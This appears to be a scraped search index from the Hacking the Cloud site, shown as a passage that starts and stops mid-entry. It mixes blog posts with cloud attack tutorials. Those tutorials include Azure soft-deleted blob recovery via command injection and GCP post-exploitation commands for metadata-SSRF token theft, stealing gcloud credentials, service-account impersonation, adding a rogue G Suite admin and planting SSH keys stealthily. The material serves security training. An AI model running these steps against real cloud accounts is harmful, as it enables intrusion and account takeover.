&lt;NextMarker/&gt;\n&lt;/EnumerationResults&gt;\n</code></pre></p>","location":"azure/anonymous-blob-access/#exploiting-anonymous-blob-access"},{"title":"Soft Deleted Blobs","text":"<p>Original Research: 0xPwN Blog - Create an Azure Vulnerable Lab: Part #3 \u2013 Soft Deleted Blobs</p> <p>In this tutorial we will see how data that has been deleted from a private Storage Account Container can still be a risk in some cases. Even if we know the full path of resources uploaded to a private container, Azure requires authentication to be accessed. To provide access we can choose between:</p> <ul> <li>A shared access signature (SAS) \u2013 is a URI that grants restricted access to an Azure Storage container. Use it when you want to grant access to storage account resources for a specific time range without sharing your storage account key.</li> <li>A connection string includes the authorization information required for your application to access data in an Azure Storage account at runtime using Shared Key authorization.</li> <li>Managed Identities</li> </ul> <p>For the sake of this tutorial, we will pretend to be a developer that uses the connection string and saves it in a config file/source code deployed to Azure. Additionally, the web application deployed has a command injection vulnerability.  We can find the connection string of a Storage Account in the Azure portal as shown below:</p> <p></p> <p>Now, the problem here is that we are giving access to the whole storage account by passing the connection string into the web app. Azure supports granular access for specific containers, for a limited amount of time, or event for a specific file within the container! But for convenience (or lack of knowledge), a developer might deploy the connection string for the entire storage account. Don\u2019t be that developer.</p> <p>The second part of this tutorial is about recovering deleted blobs. By default, when creating a storage container using the Portal, the Soft Deletion is enabled with 7 days retention time. Now image that you got access to a storage account with tens of containers, and someone at some point mistakenly uploaded an SSH key to one of these containers and than deleted it without being aware of the 7 day retention day \u201cfeature\u201d. </p> <p></p>","location":"azure/soft-deleted-blobs/"},{"title":"Exploiting Soft Deleted Blobs","text":"<p>Now, to exploit this vulnerability we navigate to the web application vulnerable to command injection and start poking around. Listing the files in the current directory, we can find among other the source code in the app.py:</p> <p></p> <p>Listing the contents of this file, we can see there is a connection string stored inside (our placeholder has been replaced at runtime with the actual value of the container):</p> <p></p> <p>Inside the Microsoft Azure Container Explorer, we specify that we want to connect to a storage account</p> <p></p> <p>And that we want to use a Connection String</p> <p></p> <p>And we paste the value of the conn_str variable that we found in the source code, and connect:</p> <p></p> <p>On the left side menu, a new storage account should show up. Navigate to the Blob Containers -&gt; images and open it:</p> <p></p> <p>At first glance, it seems that nothing of interest is stored here. Remember the flag that we accidentally uploaded? Change the view to Active and soft deleted blobs:</p> <p></p> <p>And voila! Right click -&gt; Undelete</p> <p></p>","location":"azure/soft-deleted-blobs/#exploiting-soft-deleted-blobs"},{"title":"2022 Wrap-up","text":"<p></p> <p>Nick Frichette \u00b7 @frichette_n \u00b7     December 14, 2022   </p>   <p>2022 is coming to a close and it's time to look back on the year. For Hacking the Cloud, 2022 has been a year of steady improvements. We've consistently had new content and new techniques added to the catalog throughout the year. We also expanded the type of content we offer with a full-blown, custom, CTF! With all that in mind, here are some accomplishments for the site this year, along with some noteworthy updates.</p>","location":"blog/2022_wrap-up/"},{"title":"Numbers","text":"<p>I think the best way to view how well the site is doing is to see some numbers. Here are some fun statistics. All data was pulled ~6PM Central, December 13th. In 2022, Hacking the Cloud has:</p> <ul> <li>625 stars gained on GitHub</li> <li>225 commits committed</li> <li>73,925 visits</li> <li>124,278 page views</li> <li>6,408 average monthly visitors (excluding December)</li> <li>9,763 average monthly visitors in the past quarter!</li> </ul> <p></p> <p>November in particular was a high traffic month, presumably because of multiple articles being released and gaining traction on Google's Discover.</p> <p>Compared to 2021, visitor count has increased over <code>94%</code>! (Note: 2022 is not over, hence the dotted line for 2022)</p> <p></p> <p>We have also reached 17 contributors officially on GitHub! I want to personally thank every single one of you who took the time to contribute to the site. Especially for Azure and GCP which I have no knowledge of. You all make this possible and I appreciate your contributions deeply.</p>","location":"blog/2022_wrap-up/#numbers"},{"title":"Most Popular Articles","text":"<p>Some more numbers; this time the most popular articles along with page views:</p> <ol> <li>Steal EC2 Metadata Credentials via SSRF - 10,963 page views!</li> <li>CI/CDon't - 5,842 page views.</li> <li>AWS Organizations Defaults - 5,325 page views.</li> <li>Connection Tracking - 5,209 page views.</li> <li>Using Stolen IAM Credentials - 5,043 page views.</li> </ol> <p>Once again, the Steal EC2 Metadata Credentials via SSRF article was the number one most popular page on the site! I think this is mostly attributed to high SEO ranking, along with it being a crucial security topic. </p> <p>CI/CDon't was a surprise runner up, but a happy surprise. I made this CTF specifically for Hacking the Cloud to cover some important security topics. I'm hoping that view count is indicative that folks enjoyed it and perhaps a few played it themselves.</p> <p>Using Stolen IAM Credentials ranking in the top 5 was another happy surprise. This article deviates from the standard type of article we would normally host. Typically each page of Hacking the Cloud is dedicated to an individual technique. This article was an attempt to create a \"playbook\" that would explain how an attacker should operate in a certain situation, along with OPSEC considerations. Considering that this article has been viewed so much, I definitely plan to continue this type of content. Perhaps with accompanying video content?</p>","location":"blog/2022_wrap-up/#most-popular-articles"},{"title":"RSS Feeds!","text":"<p>If you want to be the first to know when a new technique has been added to Hacking the Cloud, I have good news for you! We now have two RSS feeds thanks to the mkdocs-rss-plugin. The created feed (also linked in the footer) is the recommended feed to follow if you'd like to be notified when a new article has been added. We also have an updated feed, in case you want a notification every time a page is changed (not recommended but nobody is stopping you).</p> <p>Please note, I've been a little wary about adding RSS support to Hacking the Cloud out of fear that something will go wrong. So far, testing has been positive, but I apologize in advance if something goes haywire and you get spammed with notifications.</p>","location":"blog/2022_wrap-up/#rss-feeds"},{"title":"Plagiarism","text":"<p>Last month, I was made aware that another site was copying entire articles from Hacking the Cloud and publishing them on their own site. You can see some examples below.</p>    Hacking the Cloud Copy              <p>As you can imagine, I was pretty unhappy with this for a number of reasons. Writing content for Hacking the Cloud takes a significant time investment. Setting up test infrastructure, getting screenshots, validating logs, ensuring everything written is 100% accurate (and fixing it when things slip through) is a huge endeavor. It is deflating and frustrating when another site claims they have more content, only for you to find a non-insignificant portion of that content was copied and pasted from your work and the work of people who took time to contribute to your project. </p> <p>Furthermore, it is even more upsetting when that site has a banner seeking company sponsorships and subscription plans, potentially profiting off of work done for Hacking the Cloud (I should mention, when asked about this, the site owner told me the site does not make money).</p> <p>I am 100% supportive of citing other researchers. It's why Hacking the Cloud has links to original research, additional resources, and references at the top of each article, front and center. However, there is a huge difference between citing someone, or crediting someone, and copying the entire article, word-for-word.</p> <p>To that site owner's credit, when I raised these concerns with them they were quick to remove the plagiarized content. To my knowledge this has not been a problem since, and I don't hold any ill-will towards them.</p> <p>As a result of this incident, however, I have added additional language to our existing Plagiarism Policy to further enforce that we will not accept plagiarized content on Hacking the Cloud. Additionally, I have added additional guarantees that I will remove links/references at the author's request (including situations that don't involve plagiarism).</p> <p>Hacking the Cloud uses the MIT License which, in retrospect, was a big mistake. When this decision was made, I was not considering the potential for someone to copy content from the site and potentially monetizing it. I have spent some time looking into this, but I am not a lawyer, I don't know a thing about copyright, and I have not had much luck finding resources on how we can better protect the site's content. If you have any experience in this domain, I would love to hear from you.</p>","location":"blog/2022_wrap-up/#plagiarism"},{"title":"Mastodon","text":"<p>In a bit of an experiment, Hacking the Cloud now has its own Mastodon account! My goal with this account is to try something new. In the short term, I'd like to add a GitHub action to post to the account when a new article is published, along with posting release notes for the site.</p> <p>Long term, I'd like to cover broader cloud security news, and highlight interesting research or findings. I'm considering hooking it up to the RSS feeds of some well known blogs and sharing cloud security news that way. Feel free to give the account a follow if you're interested.</p>  <p></p>","location":"blog/2022_wrap-up/#mastodon"},{"title":"Plans for the Future","text":"<p>Aside from continuing to add to the catalog of AWS attack techniques, I have three initiatives for Hacking the Cloud in 2023. The first, as mentioned previously, will be to add what I will loosely call \"playbooks\"; step by step guides demonstrating some path along the exploit chain. With this type of content, I think there is an opportunity to showcase how individual techniques can be chained together and demonstrate how an attacker can operate in a cloud environment.</p> <p>The second major initiative is to begin adding Kubernetes attacks to the mix. While not strictly cloud-specific (I'm running a kubernetes cluster 5 feet from where I'm sitting. And, no, I haven't broken into us-east-1.... yet.), it is undeniable that Kubernetes is a massive part of many organizations' security posture. Things may get a bit blurred if anything is specific to the cloud provider's implementation of Kubernetes but we'll cross that bridge when we get to it.</p> <p>And finally, I'd like to add more resources to the site related to real world attacks. Currently, I'm planning to add references to individual techniques if they were seen in the wild and where. This way, we can get an understanding of attack trends and prioritize defenses based on real-world usage.</p>","location":"blog/2022_wrap-up/#plans-for-the-future"},{"title":"Conclusion","text":"<p>I hope you had a good 2022 and have an even better 2023. May every vulnerability you find be a critical! Happy holidays!</p>","location":"blog/2022_wrap-up/#conclusion"},{"title":"Hacking The Cloud v2: New Look","text":"<p></p> <p>Nick Frichette \u00b7 @frichette_n \u00b7     December 6, 2021   </p>   <p>Whoa! Things look a little different? You're not imagining it.</p>  <p> </p> The old look.  <p>Hacking The Cloud now uses Material for MkDocs to render the beautiful HTML you see before you.</p>","location":"blog/v2_new_look/"},{"title":"Why the Change?","text":"<p>When Hacking The Cloud was first started in mid-2020, I was primarily focused on getting the project off the ground and wasn't particularly interested in the formatting or appearance. This resulted in the choice to use a familiar technology (Hugo) and finding a freely available theme for it (zDoc).</p> <p>This helped get the project up and running quickly and allowed me to work on getting the first few pages created. Over time, however, small changes were need. Increased font size, changes to the navigation layout, CSS tweaks, etc. Recently more time has been spent making sure things looked okay rather than actually creating content.</p> <p>To be clear, the zDoc theme is excellent, there were just some changes needed that made the theme difficult to use for our purposes. These needs, combined with the appearance that the theme is no longer actively maintained, had caused me to look for something different.</p>","location":"blog/v2_new_look/#why-the-change"},{"title":"Why Material for MkDocs?","text":"<p>For the past several months I've been looking for a suitable replacement. My list of requirements was high. Additionally, I was looking for something simple, easy to use, and wouldn't have me constantly thinking, \"does this look okay on mobile?\".</p> <p>By pure luck, I found what I was looking for. Kinnaird McQuade happened to retweet an announcement from the Material for MkDocs project, and I was hooked. It looked great, supported Markdown, had admonitions, code blocks, produced static HTML, client-side search, and just about everything else I was looking for. </p> <p>More than that, it's fun and easy to work with.</p> <p>If you'd like to support Material for MkDocs you can join me in sponsoring the project.</p>","location":"blog/v2_new_look/#why-material-for-mkdocs"},{"title":"What Does This Mean for You?","text":"<p>Honestly, not a whole lot. Hacking the Cloud will now look a lot better on desktop and mobile. This will free up time and resources to focus on what actually matters, the content.</p> <p>For folks interested in contributing, you are only a pull request away! Our contributing guide has everything you need to get up and running. If you have any questions or ideas feel free to start a conversation on our discussions page.</p>","location":"blog/v2_new_look/#what-does-this-mean-for-you"},{"title":"GCP Goat","text":"<p>GCP-Goat is the vulnerable application for learning the Google Cloud Security</p> <p>The Application consists of the following scenarios</p> <ul> <li>Attacking Compute Engine</li> <li>Attacking Sql Instance</li> <li>Attacking GKE</li> <li>Attacking GCS</li> <li>Privilege Escalation</li> <li>Privilege Escalation in Compute Engine</li> </ul> <p>Project-Link </p>","location":"gcp/capture_the_flag/gcp-goat/"},{"title":"Thunder CTF","text":"<p>Thunder CTF allows players to practice attacking vulnerable cloud projects on Google Cloud Platform (GCP). In each level, players are tasked with exploiting a cloud deployment to find a \"secret\" integer stored within it. Key to the CTF is a progressive set of hints that can be used by players when they are stuck so that levels can be solved by players of all levels from novices to experts.</p>  <p>The CTF is available at https://thunder-ctf.cloud/.</p> <p>The GitHub repository for the Thunder CTF also includes:</p> <ul> <li>Least Privileges</li> <li>Cloud Audit</li> </ul> <p>Least Privilege CTF (slides) is an extension of Thunder CTF. Least Privilege levels have been desgined to help understand Google Cloud Platform's IAM roles and permissions.</p> <p>Cloud Audit is a series of code labs that will walk you through a few basic and a few more advanced cloud security concepts from a defender point of view.</p>","location":"gcp/capture_the_flag/thunder_ctf/"},{"title":"Links:","text":"<ul> <li>Website</li> <li>GitHub</li> </ul>","location":"gcp/capture_the_flag/thunder_ctf/#links"},{"title":"Enumerate Service Account Permissions","text":"<p>Link to Tool: GitHub</p> <p>On GCP it is possible to use the <code>projects.testIamPermissions</code> method to check the permissions that a caller has on the specified Project.</p> <p>To enumerate permissions you will need either a service account key file or an access token as well as the project ID.</p>  <p>Info</p> <p>The project ID can be retrieved from the metadata endpoint at <code>/computeMetadata/v1/project/project-id</code></p>  <p>The following script taken from the ThunderCTF repository can be used to enumerate permissions:</p> <pre><code>from googleapiclient import discovery\nimport google.oauth2.service_account\nfrom google.oauth2.credentials import Credentials\nimport os, sys\nfrom permissions import permissions\n\nif len(sys.argv) != 2:\n    sys.exit(\"Usage python test-permissions &lt;token | path_to_key_file&gt;\")\n\nif os.getenv('GOOGLE_CLOUD_PROJECT'):\n    PROJECT_ID = os.getenv('GOOGLE_CLOUD_PROJECT')\n    print(PROJECT_ID)\nelse:\n    sys.exit(\"Please set your GOOGLE_CLOUD_PROJECT environment variable via gcloud config set project [PROJECT_ID]\")\n\nif (os.path.exists(sys.argv[1])):\n    print(f'JSON credential: {sys.argv[1]}')\n    # Create credentials using service account key file\n    credentials = google.oauth2.service_account.Credentials.from_service_account_file(sys.argv[1])\nelse:\n    print(f'Access token: {sys.argv[1][0:4]}...{sys.argv[1][-4:]}')\n    ACCESS_TOKEN = sys.argv[1]\n    # Create credentials using access token\n    credentials = Credentials(token=sys.argv[1])\n\n# Split testable permissions list into lists of 100 items each\nchunked_permissions = (\n    [permissions[i * 100:(i + 1) * 100] for i in range((len(permissions)+99) // 100)])\n\n# Build cloudresourcemanager REST API python object\ncrm_api = discovery.build('cloudresourcemanager',\n                          'v1', credentials=credentials)\n\n# For each list of 100 permissions, query the api to see if the service account has any of the permissions\ngiven_permissions = []\nfor permissions_chunk in chunked_permissions:\n    response = crm_api.projects().testIamPermissions(resource=PROJECT_ID, body={\n        'permissions': permissions_chunk}).execute()\n    # If the service account has any of the permissions, add them to the output list\n    if 'permissions' in response:\n        given_permissions.extend(response['permissions'])\n\nprint(given_permissions)\n</code></pre>","location":"gcp/enumeration/enumerate_service_account_permissions/"},{"title":"Updating the list of permissions","text":"<p>The file containing the list of permissions needs to be created / updated before using the enumeration script.</p> <p>The file <code>permissions.py</code> should look like this:</p> <pre><code>permissions = [\n  'accessapproval.requests.approve',\n  ...\n  'vpcaccess.operations.list'\n]\n</code></pre> <p>The list of existing permissions can be obtained from the IAM permissions reference page or from the IAM Dataset powering gcp.permissions.cloud.</p>","location":"gcp/enumeration/enumerate_service_account_permissions/#updating-the-list-of-permissions"},{"title":"Steal an OAuth Token via SSRF","text":"<p>Extracted from the GitLab blog post \"Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments\" by Chris Moberly</p>  <p>If you've found an SSRF vulnerability on a server hosted in GCP, you can extract this OAuth token from the metadata server. If you're lucky, your target has not disabled the /v1beta metadata endpoint. Try this first by pointing your SSRF payload at:</p> <pre><code>http://metadata.google.internal/computeMetadata/v1beta/instance/service-accounts/default/token\n</code></pre> <p>However, most folks will have now disabled that old endpoint in favor of the more secure v1 endpoint, which requires a custom header to be set. If this is the case, you'll be redirected to /v1/ and given an HTTP 403 error. You'll need to find a way to set the header as decribed in the metadata page.</p> <p>The OAuth tokens available via the metadata server are short-lived, meaning they expire fairly quickly. This means you'll either need to work fast or get new tokens from the SSRF endpoint at regular intervals.</p> <p>If you're looking to build your own HTTP requests to mimic gcloud commands, you can run any <code>gcloud</code> command with the <code>--log-http</code> parameter to view the raw API requests.</p>","location":"gcp/exploitation/gcp-metadata-ssrf/"},{"title":"GCP Privilege Escalation","text":"<p>Extracted from the GitLab blog post \"Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments\" by Chris Moberly</p>  <p>In this section, we'll talk about ways to potentially increase our privileges within the cloud environment itself.</p>","location":"gcp/exploitation/gcp-priv-esc/"},{"title":"Organization-level IAM permissions","text":"<p>Most of the commands in this blog focus on obtaining project-level data. However, it's important to know that permissions can be set at the highest level of \"Organization\" as well. If you can enumerate this info, this will give you an idea of which accounts may have access across all of the projects inside an org.</p> <p>The following commands will list the policies set at this level:</p> <pre><code># First, get the numeric organization ID\n$ gcloud organizations list\n\n# Then, enumerate the policies\n$ gcloud organizations get-iam-policy [ORG ID]\n</code></pre> <p>Permissions you see in this output will be applied to EVERY project. If you don't have access to any of the accounts listed, continue reading to the Service Account Impersonation section below.</p>","location":"gcp/exploitation/gcp-priv-esc/#organization-level-iam-permissions"},{"title":"Bypassing access scopes","text":"<p>There's nothing worse than having access to a powerful service account but being limited by the access scopes of your current OAuth token. But fret not! Just the existence of that powerful account introduces risks which we might still be able to abuse.</p>","location":"gcp/exploitation/gcp-priv-esc/#bypassing-access-scopes"},{"title":"Pop another box","text":"<p>It's possible that another box in the environment exists with less restrictive access scopes. If you can view the output of <code>gcloud compute instances list --quiet --format=json</code>, look for instances with either the specific scope you want or the <code>auth/cloud-platform</code> all-inclusive scope.</p> <p>Also keep an eye out for instances that have the default service account assigned (<code>PROJECT_NUMBER-compute@developer.gserviceaccount.com</code>).</p>","location":"gcp/exploitation/gcp-priv-esc/#pop-another-box"},{"title":"Find service account keys","text":"<p>Google states very clearly \"Access scopes are not a security mechanism... they have no effect when making requests not authenticated through OAuth\".</p> <p>So, if we have a powerful service account but a limited OAuth token, we need to somehow authenticate to services without OAuth.</p> <p>The easiest way to do this would be to stumble across a service account key stored on the instance. These are RSA private keys that can be used to authenticate to the Google Cloud API and request a new OAuth token with no scope limitations.</p> <p>You can tell which service accounts, if any, have had key files exported for them. This will let you know whether or not it's even worth hunting for them, and possibly give you some hints on where to look. The command below will help.</p> <pre><code>$ for i in $(gcloud iam service-accounts list --format=\"table[no-heading](email)\"); do\n    echo Looking for keys for $i:\n    gcloud iam service-accounts keys list --iam-account $i\ndone\n</code></pre> <p>These files are not stored on a Compute Instance by default, so you'd have to be lucky to encounter them. When a service account key file is exported from the GCP console, the default name for the file is [project-id]-[portion-of-key-id].json. So, if your project name is <code>test-project</code> then you can search the filesystem for <code>test-project*.json</code> looking for this key file.</p> <p>The contents of the file look something like this:</p> <pre><code>{\n\"type\": \"service_account\",\n\"project_id\": \"[PROJECT-ID]\",\n\"private_key_id\": \"[KEY-ID]\",\n\"private_key\": \"-----BEGIN PRIVATE KEY-----\\n[PRIVATE-KEY]\\n-----END PRIVATE KEY-----\\n\",\n\"client_email\": \"[SERVICE-ACCOUNT-EMAIL]\",\n\"client_id\": \"[CLIENT-ID]\",\n\"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\",\n\"token_uri\": \"https://accounts.google.com/o/oauth2/token\",\n\"auth_provider_x509_cert_url\": \"https://www.googleapis.com/oauth2/v1/certs\",\n\"client_x509_cert_url\": \"https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]\"\n}\n</code></pre> <p>Or, if generated from the CLI they will look like this:</p> <pre><code>{\n\"name\": \"projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]\",\n\"privateKeyType\": \"TYPE_GOOGLE_CREDENTIALS_FILE\",\n\"privateKeyData\": \"[PRIVATE-KEY]\",\n\"validAfterTime\": \"[DATE]\",\n\"validBeforeTime\": \"[DATE]\",\n\"keyAlgorithm\": \"KEY_ALG_RSA_2048\"\n}\n</code></pre> <p>If you do find one of these files, you can tell the <code>gcloud</code> command to re-authenticate with this service account. You can do this on the instance, or on any machine that has the tools installed.</p> <pre><code>$ gcloud auth activate-service-account --key-file [FILE]\n</code></pre> <p>You can now test your new OAuth token as follows:</p> <pre><code>$ TOKEN=`gcloud auth print-access-token`\n$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN\n</code></pre> <p>You should see <code>https://www.googleapis.com/auth/cloud-platform</code> listed in the scopes, which means you are not limited by any instance-level access scopes. You now have full power to use all of your assigned IAM permissions.</p>","location":"gcp/exploitation/gcp-priv-esc/#find-service-account-keys"},{"title":"Steal gcloud authorizations","text":"<p>It's quite possible that other users on the same box have been running <code>gcloud</code> commands using an account more powerful than your own. You'll need local root to do this.</p> <p>First, find what <code>gcloud</code> config directories exist in users' home folders.</p> <pre><code>$ sudo find / -name \"gcloud\"\n</code></pre> <p>You can manually inspect the files inside, but these are generally the ones with the secrets:</p> <ul> <li>~/.config/gcloud/credentials.db</li> <li>~/.config/gcloud/legacy_credentials/[ACCOUNT]/adc.json</li> <li>~/.config/gcloud/legacy_credentials/[ACCOUNT]/.boto</li> <li>~/.credentials.json</li> </ul> <p>Now, you have the option of looking for clear text credentials in these files or simply copying the entire <code>gcloud</code> folder to a machine you control and running <code>gcloud auth list</code> to see what accounts are now available to you.</p>","location":"gcp/exploitation/gcp-priv-esc/#steal-gcloud-authorizations"},{"title":"Service account impersonation","text":"<p>There are three ways in which you can impersonate another service account:</p> <ul> <li>Authentication using RSA private keys (covered above)</li> <li>Authorization using Cloud IAM policies (covered below)</li> <li>Deploying jobs on GCP services (more applicable to the compromise of a user account)</li> </ul> <p>It's possible that the service account you are currently authenticated as has permission to impersonate other accounts with more permissions and/or a less restrictive scope. This behavior is authorized by the predefined role called <code>iam.serviceAccountTokenCreator</code>.</p> <p>A good example here is that you've compromised an instance running as a custom service account with this role, and the default service account still exists in the project. As the default service account has the primitive role of Project Editor, it is possibly even more powerful than the custom account.</p> <p>Even better, you might find a service account with the primitive role of Owner. This gives you full permissions, and is a good target to then grant your own Google account rights to log in to the project using the web console.</p> <p><code>gcloud</code> has a <code>--impersonate-service-account</code> flag which can be used with any command to execute in the context of that account.</p> <p>To give this a shot, you can try the following:</p> <pre><code># View available service accounts\n$ gcloud iam service-accounts list\n\n# Impersonate the account\n$ gcloud compute instances list \\\n    --impersonate-service-account xxx@developer.gserviceaccount.com\n</code></pre>","location":"gcp/exploitation/gcp-priv-esc/#service-account-impersonation"},{"title":"Exploring other projects","text":"<p>If you're really lucky, either the service account on your compromised instance or another account you've bagged thus far has access to additional GCP projects. You can check with the following command:</p> <pre><code>$ gcloud projects list\n</code></pre> <p>From here, you can hop over to that project and start the entire process over.</p> <pre><code>$ gcloud config set project [PROJECT-ID]\n</code></pre>","location":"gcp/exploitation/gcp-priv-esc/#exploring-other-projects"},{"title":"Granting access to management console","text":"<p>Access to the GCP management console is provided to user accounts, not service accounts. To log in to the web interface, you can grant access to a Google account that you control. This can be a generic \"@gmail.com\" account, it does not have to be a member of the target organization.</p> <p>To grant the primitive role of Owner to a generic \"@gmail.com\" account, though, you'll need to use the web console. <code>gcloud</code> will error out if you try to grant it a permission above Editor.</p> <p>You can use the following command to grant a user the primitive role of Editor to your existing project:</p> <pre><code>$ gcloud projects add-iam-policy-binding [PROJECT] \\\n    --member user:[EMAIL] --role roles/editor\n</code></pre> <p>If you succeeded here, try accessing the web interface and exploring from there.</p> <p>This is the highest level you can assign using the gcloud tool. To assign a permission of Owner, you'd need to use the console itself.</p> <p>You need a fairly high level of permission to do this. If you're not quite there, keep reading.</p>","location":"gcp/exploitation/gcp-priv-esc/#granting-access-to-management-console"},{"title":"Spreading to G Suite via domain-wide delegation of authority","text":"<p>G Suite is Google's collaboration and productivity platform which consists of things like Gmail, Google Calendar, Google Drive, Google Docs, etc. Many organizations use some or all of this platform as an alternative to traditional Microsoft AD/Exchange environments.</p> <p>Service accounts in GCP can be granted the rights to programatically access user data in G Suite by impersonating legitimate users. This is known as domain-wide delegation. This includes actions like reading email in GMail, accessing Google Docs, and even creating new user accounts in the G Suite organization.</p> <p>G Suite has its own API. Permissions are granted to G Suite API calls in a similar fashion to how permissions are granted to GCP APIs. However, G Suite and GCP are two different entities - being in one does not mean you automatically have access to another.</p> <p>It is possible that a G Suite administrator has granted some level of G Suite API access to a GCP service account that you control. If you have access to the Web UI at this point, you can browse to IAM -&gt; Service Accounts and see if any of the accounts have \"Enabled\" listed under the \"domain-wide delegation\" column. The column itself may not appear if no accounts are enabled. As of this writing, there is no way to do this programatically, although there is a request for this feature in Google's bug tracker.</p> <p>It is not enough for you to simply enable this for a service account inside GCP. The G Suite administrator would also have to configure this in the G Suite admin console.</p> <p>Whether or not you know that a service account has been given permissions inside G Suite, you can still try it out. You'll need the service account credentials exported in JSON format. You may have acquired these in an earlier step, or you may have the access required now to create a key for a service account you know to have domain-wide delegation enabled.</p> <p>This topic is a bit tricky... your service account has something called a \"client_email\" which you can see in the JSON credential file you export. It probably looks something like <code>account-name@project-name.iam.gserviceaccount.com</code>. If you try to access G Suite API calls directly with that email, even with delegation enabled, you will fail. This is because the G Suite directory will not include the GCP service account's email addresses. Instead, to interact with G Suite, we need to actually impersonate valid G Suite users.</p> <p>What you really want to do is to impersonate a user with administrative access, and then use that access to do something like reset a password, disable multi-factor authentication, or just create yourself a shiny new admin account.</p> <p>The GitLab Red Team created this Python script that can do two things - list the user directory and create a new administrative account. Here is how you would use it:</p> <pre><code># Validate access only\n$ ./gcp_delegation.py --keyfile ./credentials.json \\\n    --impersonate steve.admin@target-org.com \\\n    --domain target-org.com\n\n# List the directory\n$ ./gcp_delegation.py --keyfile ./credentials.json \\\n    --impersonate steve.admin@target-org.com \\\n    --domain target-org.com \\\n    --list\n\n# Create a new admin account\n$ ./gcp_delegation.py --keyfile ./credentials.json \\\n    --impersonate steve.admin@target-org.com \\\n    --domain target-org.com \\\n    --account pwned\n</code></pre> <p>You can try this script across a range of email addresses to impersonate various users. Standard output will indicate whether or not the service account has access to G Suite, and will include a random password for the new admin account if one is created.</p> <p>If you have success creating a new admin account, you can log on to the Google admin console and have full control over everything in G Suite for every user - email, docs, calendar, etc. Go wild.</p>","location":"gcp/exploitation/gcp-priv-esc/#spreading-to-g-suite-via-domain-wide-delegation-of-authority"},{"title":"Privilege Escalation in Google Cloud Platform","text":"Permission \u00a0Resources     <code>cloudbuilds.builds.create</code> Script / Blog Post   <code>cloudfunctions.functions.create</code> Script / Blog Post   <code>cloudfunctions.functions.update</code> Script / Blog Post   <code>cloudscheduler.jobs.create</code> Blog Post   <code>composer.environments.get</code> Blog Post 1, 2   <code>compute.instances.create</code> Script / Blog Post   <code>dataflow.jobs.create</code> Blog Post 1, 2   <code>dataflow.jobs.update</code> Blog Post 1, 2   <code>dataproc.clusters.create</code> Blog Post 1, 2   <code>dataproc.clusters.create</code> Blog Post 1, 2   <code>dataproc.jobs.create</code> Blog Post 1, 2   <code>dataproc.jobs.update</code> Blog Post 1, 2   <code>deploymentmanager.deployments.create</code> Script / Blog Post   <code>iam.roles.update</code> Script / Blog Post   <code>iam.serviceAccountKeys.create</code> Script / Blog Post   <code>iam.serviceAccounts.getAccessToken</code> Script / Blog Post   <code>iam.serviceAccounts.implicitDelegation</code> Script / Blog Post   <code>iam.serviceAccounts.signBlob</code> Script / Blog Post   <code>iam.serviceAccounts.signJwt</code> Script / Blog Post   <code>orgpolicy.policy.set</code> Script / Blog Post   <code>run.services.create</code> Script / Blog Post   <code>serviceusage.apiKeys.create</code> Script / Blog Post   <code>serviceusage.apiKeys.list</code> Script / Blog Post   <code>storage.hmacKeys.create</code> Script / Blog Post","location":"gcp/exploitation/gcp_iam_privilege_escalation/"},{"title":"Local Privilege Escalation: Modifying the Metadata","text":"<p>Extracted from the GitLab blog post \"Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments\" by Chris Moberly</p>  <p>If you can modify the instance's metadata, there are numerous ways to escalate privileges locally. There are a few scenarios that can lead to a service account with this permission:</p> <p>Default service account</p> <p>When using the default service account, the web management console offers the following options for access scopes:</p> <ul> <li>Allow default access (default)</li> <li>Allow full access to all Cloud APIs</li> <li>Set access for each API</li> </ul> <p>If option 2 was selected, or option 3 while explicitly allowing access to the compute API, then this configuration is vulnerable to escalation.</p> <p>Custom service account</p> <p>When using a custom service account, one of the following IAM permissions is necessary to escalate privileges:</p> <ul> <li>compute.instances.setMetadata (to affect a single instance)</li> <li>compute.projects.setCommonInstanceMetadata (to affect all instances in the project)</li> </ul> <p>Although Google recommends not using access scopes for custom service accounts, it is still possible to do so. You'll need one of the following access scopes:</p> <ul> <li>https://www.googleapis.com/auth/compute</li> <li>https://www.googleapis.com/auth/cloud-platform</li> </ul>","location":"gcp/exploitation/local-priv-esc-metadata/"},{"title":"Add SSH keys to custom metadata","text":"<p>Linux systems on GCP will typically be running Python Linux Guest Environment for Google Compute Engine scripts. One of these is the accounts daemon, which periodically queries the instance metadata endpoint for changes to the authorized SSH public keys.</p> <p>If a new public key is encountered, it will be processed and added to the local machine. Depending on the format of the key, it will either be added to the <code>~/.ssh/authorized_keys</code> file of an existing user or will create a new user with <code>sudo</code> rights.</p> <p>So, if you can modify custom instance metadata with your service account, you can escalate to root on the local system by gaining SSH rights to a privileged account. If you can modify custom project metadata, you can escalate to root on any system in the current GCP project that is running the accounts daemon.</p>","location":"gcp/exploitation/local-priv-esc-metadata/#add-ssh-keys-to-custom-metadata"},{"title":"Add SSH key to existing privileged user","text":"<p>Let's start by adding our own key to an existing account, as that will probably make the least noise. You'll want to be careful not to wipe out any keys that already exist in metadata, as that may tip your target off.</p> <p>Check the instance for existing SSH keys. Pick one of these users as they are likely to have sudo rights.</p> <pre><code>$ gcloud compute instances describe [INSTANCE] --zone [ZONE]\n</code></pre> <p>Look for a section like the following:</p> <pre><code> ...\n metadata:\n   fingerprint: QCZfVTIlKgs=\n   items:\n   ...\n   - key: ssh-keys\n     value: |-\n       alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice\n       bob:ssh-rsa 